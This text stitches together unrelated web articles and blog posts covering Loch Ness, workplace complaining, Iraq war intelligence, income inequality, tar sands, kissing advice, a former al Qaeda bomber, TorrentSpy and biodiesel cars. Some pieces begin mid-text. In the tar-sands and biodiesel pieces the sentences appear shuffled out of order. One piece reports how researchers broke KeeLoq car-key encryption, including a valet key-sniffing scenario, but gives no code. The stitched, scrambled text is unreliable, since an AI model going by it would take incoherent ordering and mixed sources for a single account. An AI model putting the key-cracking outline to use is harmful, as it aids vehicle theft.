About 750 feet to the bottom , it 's even deeper than the North Sea .
Nessie watcher and marine biologist Adrian Shine of the Loch Ness 2000 center in Drumnadrochit , on the shores of the lake , viewed the video and hopes to properly analyze it in the coming months .
" I see myself as a skeptical interpreter of what happens in the loch , but I do keep an open mind about these things and there is no doubt this is some of the best footage I have seen , " Shine said .
He said the video is particularly useful because Holmes panned back to get the background shore into the shot .
That means it was less likely to be a fake and provided geographical bearings allowing one to calculate how big the creature was and how fast it was traveling .
While many sightings can be attributed to a drop of the local whisky , legends of Scottish monsters date back to one of the founders of the Christian church in Scotland , St. Columba , who wrote of them in about 565 A.D.
More recently , there have been more than 4,000 purported Nessie sightings since she was first caught on camera by a surgeon on vacation in the 1930s .
Since then , the faithful have speculated whether it is a completely unknown species , a sturgeon — even though they have not been native to Scotland 's waters for many years — or even a last surviving dinosaur .
Shine doubts that last explanation .
" There are a number of possible explanations to the sightings in the loch .
It could be some biological creature , it could just be the waves of the loch or it could some psychological phenomenon in as much as we see what we want to see , " he said .
But Nessie is n't just an icon of the paranormal — she 's also an emblem of Scottish tourism .
She has been the muse for cuddly toys and immortalized on T - shirts and posters showing her classic three - humped image .
The Scottish media is skeptical of Nessie stories but Holmes ' footage is of such good quality that even the normally reticent BBC Scotland aired the video on its main news program on Tuesday .

Last week I wrote about chronic complainers at work and what to do about them .
Now , I do n’t want anyone to think that I ’m opposed to complaining as such .
Complaining can be a great tool for initiating change and if we outlaw complaining in the workplace , as some managers try to do , all we do is drive it underground where it becomes even more toxic .
So we should accept that complaining plays an important role in business , but the key thing here is to know the difference between constructive and unconstructive complaining .
Here are some of the differences :
Unconstructive : Complain about what bugs you the most
Constructive : Complain about the right thing
Is the problem really the problem ?
Or is there a deeper issue going on ?
Complain about the problem , not just the symptoms .
Unconstructive : Complain when you feel the most annoyed
Constructive : Complain at the right time
There are times to complain and times not to .
Choose a moment where there ’s time , will and energy to deal constructively with the issue .
Five minutes before an important meeting starts is probably not the time .
Unconstructive : Complain to whoever will listen
Constructive : Complain to someone who can do something about it
If your boss is the problem , complaining to your co-workers can be a lot of fun , but it changes nothing .
Complain to your boss or to the boss ’s boss .
Unconstructive : Point fingers .
Constructive : Look at yourself first .
Maybe it ’s just you who has a problem and everyone else is fine with the situation ?
Try to recognize those situations where everything is actually fine – you ’re just being irrationally annoyed ( happens to me all the time ) .
Also :
To what extent are you a part of the problem ?
How are you contributing to either the problem or to the solution ?
Before complaining about others , make sure you know what your role in the issue is .
Unconstructive : Seek blame
Constructive : Seek solutions
Going in with the intention of making people admit they ’re at fault is rarely productive .
Does it really matter whose fault it is ?
Forget blame and focus on moving on and finding lasting solutions .
Unconstructive : Only complain
Constructive : Also appreciate what ’s good
Complain when there ’s a reason to , but remember to appreciate the good stuff also – do n’t just always complain .
Did I forget anything ?
Add your thoughts in the comments !
Basically , constructive complaining leads to change whereas the unconstructive variety traps a workplace in the status quo by zapping everyone ’s energy , optimism and belief that change is possible .
And that may be part of the attraction of unconstructive complaining :
It reinforces a bad situation , but it ’s a bad situation you know and have learned to deal with .
At the same time it reinforces the status quo and protects you from change that might bring new problems you do n’t yet know how to handle .
There ’s an amount of safety and comfort in it .
But to my mind , unconstructive complaining is a tar - pit that can eventually trap even the sunniest , most optimistic person in a sticky hell of perpetual , ineffectual and often petty dissatisfaction from which people are n’t really seeking a way out .
That ’s why we need to be able to break away from the moan - mentality at work and make sure that we complain in a way that makes change happen .
Ie. constructively .

_ Establishing a stable democracy in Iraq would be a long , steep and probably turbulent challenge .
They said that contributions could be made from 4 million Iraqi exiles and Iraq 's impoverished , underemployed middle class .
But they noted that opposition parties would need sustained economic , political and military support .
_
Al - Qaida would see the invasion as a chance to accelerate its attacks , and the lines between al - Qaida and other terrorist groups " could become blurred . "
In a weak spot in the analysis , one paper said that the risk of terror attacks would spike after the invasion and slow over the next three to five years .
However , the State Department recently found that attacks last year alone rose sharply .
_ Domestic groups in Iraq 's deeply divided society would become violent , unless stopped by the occupying force .
" Score settling would occur throughout Iraq between those associated with Saddam 's regime and those who have suffered most under it . "
None of which was heeded by the White House - no funding ever made its way to those who needed it to stabilize the country .
Rumsfeld , Jay Garner and L. Paul Bremer ramrodded an ideologically - based system through which effectively , accomplished nothing except to allow the insurgency to gain its footing .
Meanwhile , four Republican senators — Bond , John Warner of Virginia , Orrin Hatch of Utah and Richard Burr of North Carolina — wrote that the report exaggerates the importance of the pre-invasion assessments .
They said the reports were n't based on intelligence information , but instead were speculation from experts in and out of government .
" They were no more authoritative than the many other educated opinions that were available in the same timeframe , " the Republicans wrote .
Yeah , unfortunately , unlike YOU a$ $holes , they happened to be right .
In almost every particular .
And YOUR PRESIDENT was warned .
Your reckless , ignorant pissant of a President .
Can we impeach these guys now ?
( Yeah , right .
Do n't bother answering that . )
These Senators take the cake for mendacity .
Remind me again why we 're kowtowing to these people and giving them their war funding ?
WHAT DOES IT FREAKIN TAKE to say NO to these people ?
As a final note , I cannot recommend more highly the following two books :
Cobra II
Chasing Ghosts
Both of which I 've just finished .
The two books magnificently and coincidentally complement one another in having the broad - picture view of the Iraq boondoggle , and the micro view from the Iraqi street in the other .
With this report appearing , it 's more fuel for the fire , despite the fact that Rockefeller released it on a FRIDAY .
*** UPDATE 2***
With every small piece of evidence that appears , it becomes even more clear that Rumsfeld and Bush 's intention was to create a new Kleptocracy in Iraq .
A Kleptocracy to replace the old one .
It 's so abundantly obvious that they never intended to do anything to help the Iraqi people .
Rieckhoff , in Chasing Ghosts , puts it well :
... In his first four years as President , George W. Bush had sent my beautiful and revered country careening over a cliff like a drunken sixteen - year - old behind the wheel of a Ferrari .
America had rushed into war based on faulty intelligence .
Iraq was a mess , and getting worse every day .
Diplomacy had been abandoned , and most of the world hated us .
Our military was being run into the ground .
Bush exaggerated our progress .
He admitted no mistakes .
He offered no new intiatives to deal with Iraq .
America was not safer .
This country 's reputation is in tatters .
It will take generations for us to wash off this stain .
*** UPDATE 3***
Some have understandably commented that this is not really news .
After all , we already knew all this .
True , but now it 's codified from a previously classified CIA report revealed by the Senate Intelligence Committee ...
So yes , we all knew it , but it was never officially acknowledged ANYWHERE in the manistream .
This is significant because a ) responsible people in the CIA were attempting all along to warn the Bushies that this would be a disaster ; b ) thus George Tenet is even more to blame for downplaying this kind of information when stepping up to the plate would really have counted for something , and was most clearly stabbing his own people in the back ; c ) brutally confirms that Bush and his people were cherry - picking intel that fit their agenda ; d ) makes publicly clear with unimpeachable evidence what all of knew - that Bush and his crowd had all the information they needed to make a decision .
It was not incompetence .
Everything was structured in a most deliberate fashion .
Slashdot had a small post about this yesterday but I 've spoken with one of the researchers about it so thought I 'd add a little more detail .
A group of Israeli and Belgian researchers found a vulnerability in the algorithm that is used to secure anti-theft digital key systems in numerous vehicles , including those made by such companies as Honda , Ford , General Motors , Mercedes Benz and Jaguar .
With that information they were able to devise an attack to crack the code of anti-theft keys .
With just an hour of remote access to the digital key of one car made by a manufacturer , the researchers say they are able not only to crack the unique code for that specific key but can also determine the key initialization process used to code the digital keys for all of the cars made by that manufacturer .
From there , it 's pretty simple for them to crack the unique code of another car made by that company .
" There is one master key from which is derived the key for each car a company makes , " says Orr Dunkelman , a researcher from the University of Leuven in Belgium who worked on the project with four colleagues .
The cipher the researchers examined , known as KeeLoq , is used to lock and unlock many vehicles that employ remote - control key - less systems and digital key systems – key fobs and keys that are embedded with a chip that transmits a unique digital code .
The devices not only lock and unlock car doors but can also mobilize or immobilize a vehicle and operate its alarm system .
The KeeLoq technology , which is licensed by Microchip Technology to car makers and other entities , has long been considered to be pretty secure .
Each KeeLoq key or key fob uses a unique value , out of billions and billions of possibilities , to unlock a car .
But after proprietary information about KeeLoq was leaked to a Russian hacking web site ( pdf ) last year , the five researchers , from the University of Leuven as well as the Hebrew University and the Technion in Israel , began examining the system for vulnerabilities .
Within three to five days Dunkelman says they developed their first basic attack , then spent months refining their technique .
The attack involves probing a digital key wirelessly by sending 65,000 challenge / response queries to it .
Once the researchers collect 65,000 responses – which takes about an hour – they use software they designed to decipher that key 's unique code .
The deciphering currently takes about a day using a dedicated computer .
But once they 've cracked one key , they know 36 bits of the 64 bits they need to know .
Those 36 bits are identical for every car model a manufacturer makes ( different car models will vary only slightly ) .
This does n't mean Dunkelman can just walk onto a parking lot and open any car that 's the same model of the one he cracked .
He still needs to crack the unique key used to open the other cars .
But because he already knows the 36 bits that are common to all of the keys for one model of car , it takes only a few seconds to crack those other keys .
He can do this by reading the keys wirelessly – for example , while sitting next to a patron at a restaurant or standing near a car when an owner opens it and sniffing the communication between the digital key and the car .
Once he has a key 's unique code , he can encode it to a chip in a remote device ( which he can do in a couple of seconds in the field ) and use it to open and steal the car .
Dunkelman says an ideal scenario might be for a valet attendant to sniff the keys of cars in his charge to obtain the 36 bits for several different makes and models .
" If you go to a restaurant and leave your car with valet parking , the parking guy can probe your key while you 're eating and enjoying your steak and by the time you leave he has all the information he needs , " says Dunkelman .
Last week Dunkelman and his colleagues contacted Microchip Technology to report their findings .
They also discussed the findings at the Crypto conference .
But they say they wo n't release their research paper publicly until after they 've heard from Microchip .
A spokeswoman for Microchip declined to comment on the researcher 's findings .

Social inequality in US hits new record
By Bill Van Auken
16 October 2007
The Internal Revenue Service issued a report last week documenting record levels of social inequality in the United States .
According to the data released by the IRS , America ’s wealthiest 1 percent accounted for 21 percent of all income in 2005 , while the bottom 50 percent earned just 12.8 percent of the total national income .
While the share of income taken in by the wealthiest 1 percent rose steeply — up three points from 19 percent in 2004 — the share for the half of the population at the bottom of the economic ladder fell during the same period by 0.6 percent .
The IRS data , published in the Wall Street Journal last Friday , are based on “ adjusted gross income ” reflected in tax returns for 2005 .
This measure provides a starker and more accurate picture than other indices of the staggering polarization between wealth and poverty in America .
It records individual income after deductions for such expenses as alimony or individual retirement accounts , and includes capital gains , a major source of income for the very rich .
It also breaks down the figures relating to the wealthiest social layers , spelling out the obscene levels of income raked in by the top 1 percent and top 0.1 percent , as opposed to other reports that lump this relative handful of multimillionaires and billionaires together with average figures for the top 10 percent .
The share claimed by this wealthiest layer has now surpassed the previous record recorded during the stock market boom of the 1990s .
And , while the IRS has kept such data only since 1986 , it is believed that the present percentage of the national income going to this layer is higher than at any time since the period that preceded the Wall Street crash of 1929 and the Great Depression .
Even George W. Bush is compelled to acknowledge the prevalence of social inequality in America .
In an interview with the Wall Street Journal , the president said , “ First of all , our society has had income inequality for a long time . ”
By way of explanation , Bush , the offspring of a family worth many millions , declared , “ Skills gaps yield income gaps . ”
The Wall Street Journal was more candid than the president , acknowledging that while the IRS did not spell out the source of rising income for the wealthy , the “ boom on Wall Street has likely played a part . ”
The newspaper went on to point out the enormous accumulation of wealth on Wall Street itself , citing a recent study from the University of Chicago showing that twice as many Wall Street executives count themselves in the top 0.5 percent income bracket as their counterparts in other sectors of the economy .
One of the authors of the study , Joshua Rauh , told the Journal , “ It ’s hard to escape the notion ” that the increasing monopolization of wealth at the top is a “ Wall Street , financial industry - based story . ”
Summarizing the study , the Journal reported that “ the highest - earning hedge - fund manager earned double in 2005 what the top earner made in 2003 , and the top 25 hedge - fund managers earned more in 2004 than the chief executives of all the companies in the Standard & Poor ’s 500 stock index combined . ”
The study also found “ profits per equity partner at the top 100 law firms doubling between 1994 and 2004 , to over $ 1 million in 2004 dollars . ”
The data released by the IRS indicated that the minimum annual income needed to make it into the top 1 percent rose 3 percent between 2000 and 2005 to $ 364,647 .
On the opposite end of the social scale , the median income of tax filers had fallen 2 percent between 2000 and 2005 to just $ 30,881 , with fully half of the population struggling to get by on less than that .
Earlier data released by the US Census Bureau established that every section of the population outside of the top 5 percent saw their real income fall between 2000 and 2005 .
According to one recent study , while real income for the bottom 90 percent of the population fell by 11 percent between 1973 and 2005 , those in the top .01 percent bracket , comprising some 14,000 households with annual incomes averaging nearly $ 13 million , saw their take increase by 250 percent over the same period .
What emerges from the data are the effects of a long - standing social policy involving a massive transfer of wealth from working people , the great majority of the population , to a handful of the super - wealthy , who have enriched themselves at the expense of the rest of society .
This is not merely an American , but rather a global policy that has been carried out on the backs of the working class of every country .
A study released last week by the Boston Consulting Group found that the world ’s 9.6 million millionaires — comprising just 0.7 percent of the earth ’s population — now control $ 33.2 trillion in wealth — roughly a third of all the wealth in the world .
According to the study , the world ’s wealthiest 0.1 percent — those with $ 5 million or more in financial assets — now owns 17.5 percent of global wealth .
Meanwhile , half of the world ’s population — some 3 billion people — live on less than $ 2 a day .
The social cost of this vast accumulation of wealth by the financial elite grows daily .
A report issued last week by the Center for Economic and Policy Research and the Center for Social Policy at the University of Massachusetts in Boston found that 41 million working families in America — one in five — are unable to cover the costs of basic necessities with the money they earn working for low pay and no benefits .
The study found that many of these workers are ineligible for federal support in the form of child care assistance , the Earned Income Tax Credit , Food Stamps , housing assistance , Medicaid or the State Children ’s Health Insurance Program , and Temporary Assistance to Needy Families .
Eligibility for such assistance has been steadily tightened by federal and state governments .
The demagogy of the current crop of Democratic presidential candidates about defending the “ middle class ” notwithstanding , these policies have been enacted by Democratic and Republican administrations alike .
The growth of income inequality in America has continued unbroken since 1973 , spurred by the high - interest - rate , recessionary policies enacted by Federal Reserve Board Chairman Paul Volcker — Democratic President Jimmy Carter ’s appointee — with the deliberate aim of driving up unemployment , slashing wages and unleashing a big business offensive against the working class .
It was under the Clinton administration that the top 1 percent set their previous record share of the national income — 20.8 percent in 2000 , Clinton ’s last year in the White House .
This was up from about 14 percent when he first took office .
The increased concentration of wealth was fueled by the Democratic administration ’s deregulation of the financial markets , which spurred the financial bubble of the ‘ 90s that gave rise to much of today ’s financial elite .
At the other end of the social ladder , the Clinton White House carried out a ruthless war against the working class and poor , carrying through its pledge to “ end welfare as we know it ” and slashing other areas of social spending .
From the beginning of the Bush administration , the Democrats have helped pass round after round of tax cuts for the rich , running into the trillions of dollars .
Even a limited proposal to close a tax loophole that has allowed hedge and equity fund managers earning hundreds of millions of dollars a year to pay a lower tax rate than a bus driver or an office worker was shelved earlier this month by the Democratic Senate leadership , in deference to the party ’s well - heeled contributors on Wall Street .
The inequality that pervades every facet of American society inevitably finds its expression within the Democratic Party , which , while posturing as the party of the people , remains a political instrument of the ruling financial elite .
Among the Democratic candidates , the three front - runners — Hillary Clinton , Barack Obama and John Edwards — are all millionaires .
Roughly half of the US Senate is made up millionaires , many of them Democrats .
The House , meanwhile , is led by Speaker Nancy Pelosi , who in her latest financial disclosure forms reported that she and her investor husband conducted some 30 stock sales and purchases last year , many of them involving sums up to $ 1 million each .
She also reported owning a California vineyard , valued between $ 5 million and $ 25 million .
The Democrats will do no more to reverse the growth of social inequality than they will to end the war in Iraq .
In the final analysis , the explosion of militarism abroad and the destruction of working class living standards at home are two sides of a common political agenda aimed at funneling the wealth of the US and the world into the coffers of a financial oligarchy .
He was also the one who coined " The Law of Receding Horizons . "
For those who missed my previous articles on receding horizons , it is a simple concept : as the cost of energy rises , the cost of everything else made with energy ( like building materials ) also rises .
So an energy project which was expected to be profitable when energy costs were x amount higher than today , turns out to still be uneconomical when you get there .
For this week 's article , I collaborated with energy journalist Roel Mayer , a freelance writer on earth , energy and economy , based in Canada .
Roel is a keen observer on energy , and the Canadian tar sands in particular , so he was a natural research partner for this short study on the state of oil production from tar sands .
This is a guest post by Chris Nelder .
It was originally written for Friday 's Energy and Capital .
Part II will be available next Friday .
And the tar sands of Alberta are shaping up to be the oil industry 's poster child of this phenomenon .
With oil well over $ 60 today , the low - grade sludge called kerogen that we recover from tar sand -- actually more like a putty , at room temperature , which is why I refuse to use the whitewashing term " oil sands - - should be highly profitable .
But paradoxically , the impending decline of global crude oil production , which is now coming clearly into view , has led to a mad rush to produce the tar sands .
And this , in turn , has led to skyrocketing costs ... such that now , the real " profit " in producing the tar sands seems to be in government tax breaks , not in actual profit on the resource itself .
In fact , the Canadian tar sands operations are facing a whole host of challenges , beyond economic -- so much so , that one wonders why we try to harvest them at all .
In an area the size of Florida , Alberta 's tar sands are said to hold 315 billion barrels of crude oil .
But trying we are : according to the respected energy analytics firm Wood Mackenzie ( WoodMac ) , about $ 117 billion is going to be spent on the tar sands by 2015 .
Let 's look at some of the challenges .
Cost Inflation
In a fine demonstration of the receding horizons paradox , WoodMac issued a report in March entitled " The Cost of Playing in the Oil Sands , " which showed a 55 % cost increase since 2005 for a peak flowing barrel of oil derived from the tar sands .
They further noted that in 2006 alone , many of the large tar sands developers announced cost increases and project delays , as they experienced an average 32 % cost increase for integrated mining projects , and a 26 % increase for in situ projects .
For example , last year Shell Canada shook investors when it revealed that its Athabascan tar sands operation would cost $ 11 billion Canadian to expand its operation by only 100,000 barrels per day - six times the original cost estimate , which was made only about eight years earlier .
Around the same time , a research report by Merrill Lynch said the cost increase would mean that the Athabasca project would only make about a 10 % return on its investment if oil were to remain at least $ 50 per barrel !
WoodMac analyst Conor Bint issued a clear warning about the tar sands ' receding profitability horizon , saying , " Companies in the oil sands will have to control capital expenditures going forward to ensure that project breakeven prices do not exceed current levels in order to remain profitable . "
And what are the cost - inflating culprits , according to Bint ?
The usual litany : labor shortages and skyrocketing material costs .
" With the sheer number of oil sands projects together with the future arctic pipelines and conventional oil and gas developments in Alberta , labour demands in Canada will be pushed to their limits . "
Which sort of calls bullshit on their helpful tip that good project management and contractor scheduling will help keep costs in line .
No doubt , you must carefully watch your labor hours when your typical field hand is pulling down " combat pay " in the six figures .
But that is n't going to help you a bit when tires , steel , machines , and basic metals are all going through the roof under the crush of increasing global demand , primarily driven by Asia , and primarily due to high oil costs .
For example , the price of steel is up 70 % in just the last five years .
In a recent essay on the cost inflation of conventional oil projects ( " Upstream Economics and the Future Oil Supply " ) , oil analyst Dave Cohen made the shrewd observation that " the situation presents a classic Catch - 22 , " where " the cure for industry inflation is a slowdown in upstream activity , whereas the initial goal was to accelerate upstream development to meet growing global oil demand . "
Cohen notes that the cost of finding and producing oil has outpaced the growth in the price of oil .
While oil has risen about 32 % since 2005 , costs have increased about 79 % .
Given that the cost of finding and producing conventional oil is in the neighborhood of one - fifth that of producing tar sands , this is not an investment - friendly scenario .
Finance
Naturally , the aforementioned factors are leading to questions about the long - term viability of the tar sands industry , and slowing the pace of financing for its projects .
For not only are costs rising , they 're rising faster every year , across the board : for labor , materials , and energy .
And in all likelihood , taxes and pollution - related costs will soon join the list .
Each of these trucks weighs more than two 747 airplanes .
" It 's like driving your house downtown . "
For example , Canadian Natural Resources Ltd. said in March it would n't move forward with its plans to build an upgrader plant due to runaway costs , and Synenco Energy Inc. shelved its upgrader in May .
Likewise , last year France 's Total SA announced that it was pushing its tar sands project back by three years , again due to soaring costs for labor and materials .
" I do n't think it 's an anomaly , " says Mark Friesen , a Calgary - based analyst at FirstEnergy Capital Corp .
" I think it 's an indication of how difficult the environment is .
If we 're not careful , more projects may end up being delayed or cancelled . "
Delays are now becoming endemic to tar sands operations .
Major equipment such as cokers and metallurgical towers now have waiting times of two years or more , more than double the wait of three years ago .
( Now there 's an obvious investment opportunity . )
A shifting landscape of taxation also dogs tar sands ambitions .
The removal this year of a significant tax advantage for Canada 's income trusts , which have been among the largest backers of tar sands projects , caused Canadian Oil Sands , one of the largest trusts , to post its first net loss in its 10 - year history .
An accelerated capital cost allowance that was initially offered to drive investment in the sands has also been removed this year , which should net the federal government an additional $ 1.4 billion or so .
But perhaps the biggest financial threat is a change in the royalty rates .
For over a decade , Alberta sought to attract financing by offering a mere 1 % royalty rate until the initial costs of the projects are paid off , at which point the rate reverts to 25 % .
It 's no surprise then that tar sands developers appear to be gaming the system by extending their " initial " investment in phases over a period of years , effectively stretching out the time they can take advantage of the 1 % rate .
That rate typically translates to less than 50 cents on a $ 70 barrel for Alberta 's coffers .
On the roughly $ 15 billion in tar sand revenue in 2004 , Alberta took home only $ 700 million .
And the $ 905 million that Alberta took in last year was actually less than it garnered from lotteries .
Consequently , Alberta is eyeing some additional changes to its tax structure for tar sands .
It does n't want to be accused of bait - and - switch tactics , but it's also facing the aforementioned increasing costs for all public services .
At the same time , it is looking at an overall decline in income , due to the winding down of its conventional oil and gas operations , which pay up to 40 % in royalty rates .
And let 's face it : given the immense challenges ahead of us for liquid fuels , thanks to peak oil , and the desperation of oil companies to find anything worth investing in at this point , a 1 % royalty rate seems an outright steal of natural capital from the people of Canada .
No wonder that a public consultation process on the taxation of tar sands projects is now under way .
If the royalties on the tar sands were allowed to rise to anywhere near the normal levels for oil - around 40 % , not 1 % - the entire industry would cease to be .
The profit would vanish , simple as that .
Next week , we 'll look at the rest of the tar sands ' troubles : water , energy , labor , and the environment .
Until next time ,
Chris

What ’s the key difference between those good - looking guys out there that are n’t getting any , and those rather plain guys that have several girls sighing and swooning after them ?
It ’s pretty simple , the way I see it .
It ’s the kiss .
It seems to me that guys either do n’t know how to kiss , or just do n’t care to do it right .
Too many men seem to view the kiss as something on a checklist on the way to getting a girl into bed .
Well , I ’ve got news for you guys – the way you kiss can make all the difference between “ Take me now ” and “ Take off , ya jerk .
” I guess I consider myself a bit of a kissing aficionado .
I like kissing , and I like being well - kissed .
Sadly , that does n’t happen often .
In the last two years , I ’ve kissed eight men ( and I wo n’t tell you how many before that ) .
One was really good at kissing , and I could smooch with him for hours .
Another was pretty good – I was really sad when our make - out session ended .
All the other kisses were something I tolerated , even endured .
One guy , I kid you not , had two steps – press open mouth to hers , stick tongue out as far as possible .
Yuck !
Trust me , the last thing a girl wants is somebody ’s mushy wet open mouth laving drool all over her mouth and chin .
Think about it - do you really want a woman to associate the words ' soft ' and ' mushy ' with you ?
The first key to a good kiss is your attitude .
The kiss is not some golden base to be raced to , but neither is it simply a minor step on the way to more .
If done correctly , a kiss will send your lady ’s heart racing , make her breath uneven , and have her dragging you to the bedroom .
A kiss should never be rushed , and should never be just unloaded like a suitcase at the door .
A good kiss will be an exercise in teasing – holding up the promise of that little bit more , until she ’s practically begging for your touch .
Before your lips ever touch , take some time to build up to a good kiss .
You do n’t want to spring it on her like some unpleasantness to be gotten out of the way .
The kiss starts with your hands , not your mouth .
Touch her .
Hold her hand .
Rub her arm , if she likes it .
Rub her shoulders , if she likes that .
This gives you an excuse to be close to her , and leads her to anticipate your kiss .
And do n’t kiss her as soon as you think you can get away with it , or turn a quick hug into a guerrilla smooch .
You ’ll know when she ’s ready – she ’ll turn to face you , and perhaps bare her neck to you – that ’s because she ’s turning her head to an angle , even if she does n’t know it .
And she ’ll lean toward you , trying to line it up .
At least the first time , ignore it .
Play with her hair or run your finger along her jawline .
Move up close .
If you ’ll listen , her breathing will be shallow and quick , if she ’s really concentrating on kissing you .
Take a moment to enjoy the pleasant way she smells , or how soft the skin is on her cheek .
And whatever you do , do n’t yet open your mouth .
A proper kiss starts with lips closed , pursed even .
There ’s no reason it should start lip to lip , either .
Remember appreciating the soft skin of her cheek ?
It ’s soft because it ’s meant to be kissed .
The corner of her mouth is soft , too – kiss there .
You ’ve chased her to get to this point – let her chase you a little .
Kiss anywhere except where she expects you to , at least three touches , maybe more .
Then kiss lip to lip – and still with your mouth closed .
There ’s no hurry – eventually let your tongue steal out and just barely brush her lips .
If she ’s ready for a more open kiss , she ’ll open and respond in kind .
Let her invite you inside – do n’t go barging in , guys – it ’s not your house .
And invite her to follow you back home , so to speak .
There ’s no bonus points for counting each others ’ back teeth .
Finesse is what it ’s all about .
Now there ’s some variation here that you have to consider .
Some people prefer soft kisses , almost mushy .
Warm and moist and soft , like pillows .
Others lean toward tighter lips and firmer kisses , or somewhere between the two extremes .
If you sense her lips getting really tight , you ’re too mushy .
And if she goes really soft , you ’re probably so firm you ’re hurting her .
Adjust until you ’re both on the same level .
Everyone will have a difference place where they feel comfortable – every couple will be different .
Another thing to thing about ahead of time is taste .
Everyone knows to avoid the onions before kissing .
But do n't just avoid a bad taste - go for the good taste !
Try some chocolate , or some minty gum .
One of the best kisses I ever experienced was with a man who was drinking red wine .
I was drinking something else , and when I tasted him ... mmm....
Go for a pleasant taste that contrasts nicely .
If you start your kiss with some anticipation , and build it slowly , paying attention to cues from her – short shallow breaths , trembling limbs , whatever – you ’ll have her attention .
Take the time to tease a little – hold back what she really wants for just a moment longer , kiss around her mouth , make her take the aggressive stance .

RIYADH , Saudi Arabia --
Ahmad al Shayea is the rarest of truck bombers -- he survived his suicide mission in Iraq even though the blast from his bomb was strong enough to kill 12 bystanders .
Ahmad al Shayea survived his truck bomb attack , but not without scarring to his face and hands .
Al Shayea , who was disfigured during the attack , claims al Qaeda tricked him into becoming a bomber by asking him to deliver a tanker truck , which they had rigged with a bomb .
" They told me to take it to an address in Baghdad .
As soon as I got there the truck exploded , " said the native of Saudi Arabia .
He survived by jumping out of the truck .
Al Shayea renounced terrorism and returned to Saudi Arabia , where he works to convince would - be insurgents and terrorists to give up their deadly ways .
" I think God took me out of death to show others what can happen , " he told CNN .
" If you join al Qaeda , they will use you , and maybe you will die . "
Hear why al Shayea turned his back on al Qaeda »
Al Qaeda propaganda videos glorify so - called foreign fighters in Iraq like al Shayea .
It has recruited them from countries all across the Middle East .
Some Iraqi officials say more Saudis than any other nationality have responded to al Qaeda 's call .
Saudi officials and the U.S. military deny that claim .
But Saudi sources do admit that more than 800 young Saudis have gone to Iraq to fight .
That 's far more than the Saudi government has acknowledged until now .
Since 9/11 , when 15 of the 19 hijackers were Saudis , the oil rich kingdom has been accused of spreading radicalism .
It 's a claim that stings this longtime U.S. ally , which also finds itself in al Qaeda 's cross hairs .
So now , Saudi officials say they are escalating their fight against homegrown al Qaeda militants .
Former insurgents and terrorists like al Shayea are their chief weapon in the battle for the hearts and minds of young Saudis .
" The reality behind it is the religious misunderstanding of Islam , so we have to correct the ideas , " said Dr. Turki Al - Otayan , a psychologist .
Al Shayea and hundreds of other Saudis who were aligned with terrorists are being re-educated in prisons and rehabilitation centers .
They are taught that al Qaeda 's emphasis on a violent approach to Islam is wrong .
The program offers early release from prison .
It 's available only to captured jihadis who demonstrate a willingness to change over the course of repeated interviews with specialists .
Al Shayea said he was questioned by security forces , then clerics , then psychologists .
" They looked at my mood , listened to me .
They were nice , " he adds .
Al - Otayan said the review is thorough .
" We make sure he understands dialogue .
We make sure he is not just lying .
So it is not an easy job I can assure you , " he said .
The Saudi government says more than 1,000 former al Qaeda recruits have been through the program .
Seven hundred of them are now free .
Critics , mainly from the country 's security forces , fear mistakes could allow some al Qaeda fighters back on the street .
A native of Saudi Arabia , al Shayea was just 19 when he went to Iraq to fight for al Qaeda against American forces .
He was angered , he said , by scenes of U.S. troops killings his fellow Muslims .
" I went to Iraq with Saudi men because jihad is a duty for every Muslim , " he said .
" I went to Iraq to fight the jihad and kill Americans . "
He was hoping to take up arms against Americans , but said he never envisioned himself as a suicide bomber .
After his truck bomb exploded , al Shayea was captured and paraded on Iraqi TV .
Burned and bandaged , he was blamed for the death of 12 bystanders .
He confessed .
Iraqi security officials deported him to Saudi Arabia .
Today , with the backing of the Saudi government , al Shayea gets his anti-al Qaeda message out on fliers that include pictures of him before and after his bombing .
He has become the anti-Al Qaeda example .
" I learned my lesson , and others will learn as well , " he said .

Starting today , TorrentSpy blocks all searches from US visitors and redirects them to a privacy statement .
TorrentSpy is caught up in a lawsuit in which the MPAA demands that TorrentSpy hands over all user info stored in " random access memory " ( RAM ) .
This service denial seems to be a preventative measure to protect their users , when US users try to search on TorrentSpy they now get this message :
Sorry , but because you are located in the USA you cannot use the search features of the Torrentspy.com website .
Torrentspy ’s decision to stop accepting US visitors was NOT compelled by any Court but rather an uncertain legal climate in the US regarding user privacy and an apparent tension between US and European Union privacy laws .
The search redirect will be permanent , TorrentSpy owner Justin Bunnell told TorrentFreak : “ We must comply with European Union privacy laws and turning off USA traffic was the only way to guarantee that protection for our users .
It is not something with a time limit . ” .
Over 15 % of TorrentSpy ’s visitors are US residents , shutting them down for good will be a disaster for the site .
We also asked Justin how he thinks this will affect the future of TorrentSpy , and he responded : “ Whatever future awaits , the innovations of peer - to - peer technology and the jobs and opportunities it creates will take place outside of the USA . ”
TorrentSpy currently does not log any user data , but if the court decides that they have to hand over all information stored in RAM , this would be a huge blow to Internet privacy .
The MPAA reasons that all IPs , downloaded . torrent files , dates and other user info are temporarily stored in RAM for a few milliseconds and demands that TorrentSpy logs this info and hands it over to the MPAA .
Basically they are demanding that TorrentSpy should keep server logs ( pdf link ) .
TorrentSpy lawyer Ira Rothken is determined to fight this but said in a statement about the case : “ The odds favor the copyright owners , copyright law in this country is Draconian and dramatically skewed on the owner ’s side ” .
Everything TorrentSpy does also applies to other search engines according to the TorrentSpy defense .
Last year , when the case started , Rothken said “ It [ TorrentSpy ] can not be held ‘ tertiary ’ liable for visitors ’ conduct that occurs away from its web search engine ” .
TorrentSpy claims it did nothing illegal and suggested the MPAA should sue Google .
To be continued …
Update : A federal judge ruled that TorrentSpy must log all data stored in RAM , this is why TorrentSpy blocked the searches .
" I feel so superior driving next to a Hummer and going , ‘ Dude , yo , look at this , this is what you should be doing , ' " Brooks said .
Colette Brooks ' sprawling ocean - view property * is dotted with tricked out cars -- from a low - rider Lincoln Continental to a Cadillac with plush leather seats .
The petite 49 - year - old business owner might be a car junkie , but she 's indulging her obsession without polluting the air by running her rides on biodiesel and other alternative fuels .
The story is about a woman who has a number of cars that have been modified to run off of biodiesel .
The cars include gas guzzlers like a Lincoln Continental Mark V , a Chevy Tahoe , and a Cadillac .
But because she is running them on biodiesel , she thinks she is neither using oil nor polluting :
While I sincerely appreciate her intent , someone walking , riding a bike , or even driving a Prius running entirely on gasoline could say the same to her .
She does not recognize that her fossil fuel footprint is still very high .
The problem with these sorts of perceptions is that they end up shaping policy .
People may not recognize the critical need for conservation if they think they have eliminated their fossil fuel usage by switching to biodiesel ( or corn-ethanol ) .
Today , at least 10 vehicles are parked on her property in Malibu .
They include the Lincoln Continental Mark V designed by the late fashion designer Bill Blass .
